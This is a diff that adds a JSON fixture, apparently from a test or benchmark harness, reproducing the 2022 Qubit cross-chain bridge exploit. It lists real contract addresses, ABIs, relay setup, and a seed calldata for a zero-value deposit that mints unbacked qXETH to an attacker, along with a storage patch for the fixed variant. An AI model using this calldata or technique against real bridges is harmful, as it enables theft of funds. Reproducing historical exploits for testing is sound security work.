@@ -1,0 +1,52 @@
+{
+  "fixture_id": "qubit_2022_onchain",
+  "variants": {"vulnerable": ".", "patched": "."},
+  "cross_chain": true,
+  "deploy": [],
+  "setup": [
+    {"from": "0xbeE397129374D0b4db7bf1654936951e5bdfe5a6", "to": "QBridgeBSC", "fn": "grantRole", "args": ["0xe2b7fb3b832174769106daebcfd6d1970523240dda11281102db9363b83b0dc4", "0x00000000000000000000000000000000000Be1a7"]}
+  ],
+  "relay": [
+    {"emitter": "QBridgeETH", "event": "Deposit", "to": "QBridgeBSC", "fn": "voteProposal", "args": [0, "ev:depositNonce", "ev:resourceID", "ev:data"]}
+  ],
+  "victims": [],
+  "asset_pairs": [["qXETH"]],
+  "release_entrypoints": ["QBridgeBSC.voteProposal"],
+  "notes": "Qubit 2022 dual-chain on-chain fork. Source: ETH QBridge 0x20E5E35b (block 14090169); the legacy deposit() accepts resourceID whose token is address(0) with contractWhitelist[address(0)]=true, so a 0-value deposit emits a Deposit event. Dest: BSC QBridge 0x4d8aE68f (block 14738000); the faithful relay delivers the Deposit event to voteProposal, which mints qXETH 0xfd7a5506 to the attacker. The harness relayer is registered via adminAddRelayer in setup (modeled: the legitimate relayer delivers the message; the exploit abuses a faithful relay, not a compromised one). Real incident: ETH tx 0xac7292e7..., BSC tx 0x50946e3e....",
+  "onchain": {
+    "contracts": [
+      {
+        "name": "QBridgeETH",
+        "side": "source",
+        "address": "0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6",
+        "abi": [
+          {"type": "function", "name": "deposit", "stateMutability": "payable", "inputs": [{"name": "destinationDomainID", "type": "uint8"}, {"name": "resourceID", "type": "bytes32"}, {"name": "data", "type": "bytes"}], "outputs": []},
+          {"type": "event", "name": "Deposit", "anonymous": false, "inputs": [{"name": "destinationDomainID", "type": "uint8", "indexed": false}, {"name": "resourceID", "type": "bytes32", "indexed": false}, {"name": "depositNonce", "type": "uint64", "indexed": false}, {"name": "depositer", "type": "address", "indexed": true}, {"name": "data", "type": "bytes", "indexed": false}]}
+        ]
+      },
+      {
+        "name": "QBridgeBSC",
+        "side": "dest",
+        "address": "0x4d8aE68fCAe98Bf93299548545933c0D273BA23a",
+        "abi": [
+          {"type": "function", "name": "voteProposal", "stateMutability": "nonpayable", "inputs": [{"name": "originDomainID", "type": "uint8"}, {"name": "depositNonce", "type": "uint64"}, {"name": "resourceID", "type": "bytes32"}, {"name": "data", "type": "bytes"}], "outputs": []},
+          {"type": "function", "name": "grantRole", "stateMutability": "nonpayable", "inputs": [{"name": "role", "type": "bytes32"}, {"name": "account", "type": "address"}], "outputs": []}
+        ]
+      },
+      {
+        "name": "qXETH",
+        "side": "dest",
+        "address": "0xfd7a5506f434f5334c100efb765025243c39137c",
+        "abi": [
+          {"type": "function", "name": "balanceOf", "stateMutability": "view", "inputs": [{"name": "account", "type": "address"}], "outputs": [{"name": "", "type": "uint256"}]},
+          {"type": "event", "name": "Transfer", "anonymous": false, "inputs": [{"name": "from", "type": "address", "indexed": true}, {"name": "to", "type": "address", "indexed": true}, {"name": "value", "type": "uint256", "indexed": false}]}
+        ]
+      }
+    ],
+    "seeds": [
+      {"contract": "QBridgeETH", "calldata": "0x05e2ca17000000000000000000000000000000000000000000000000000000000000000100000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f0100000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006900000000000000000000000000000000000000000000000a4cc799563c380000000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7"}
+    ],
+    "patch": {"storage": [{"side": "source", "address": "0x17B7163cf1Dbd286E262ddc68b553D899B93f526", "slot": "0x5843af22e99e7c98370145a5056245c244ce8ee852f4ef5e6d6a8e410a18cf41", "value": "0x0000000000000000000000000000000000000000000000000000000000000000"}]},
+    "fund": ["0xbeE397129374D0b4db7bf1654936951e5bdfe5a6"]
+  }
+}
